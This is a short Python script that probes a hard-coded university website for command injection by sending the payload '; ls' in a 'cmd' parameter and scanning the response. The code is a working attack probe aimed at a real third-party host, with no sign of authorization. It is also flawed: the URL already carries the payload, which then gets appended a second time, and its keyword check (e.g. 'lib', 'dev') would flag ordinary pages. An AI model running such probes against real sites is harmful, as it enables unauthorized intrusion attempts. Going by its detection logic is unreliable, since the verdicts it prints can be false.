import requests
import re

def is_command_injection_vulnerable(url):
    # Command Injection detection via common payloads
    payload = "; ls"  # Unix command to list files (useful for detection)
    response = requests.get(url + "?cmd=" + payload)
    
    print(f"Response for {url} with payload {payload}:")
    print(response.text)  # Print the raw response from the server

    # Check for presence of common system command results like file listings
    if re.search(r"bin|boot|dev|etc|lib|proc", response.text, re.IGNORECASE):
        return True
    return False

# Test URL (replace with your target URL)
url = "https://www.vit.edu/index.php/?cmd=; ls"
is_vulnerable = is_command_injection_vulnerable(url)

if is_vulnerable:
    print(f"The URL {url} is vulnerable to Command Injection!")
else:
    print(f"The URL {url} is not vulnerable to Command Injection.")
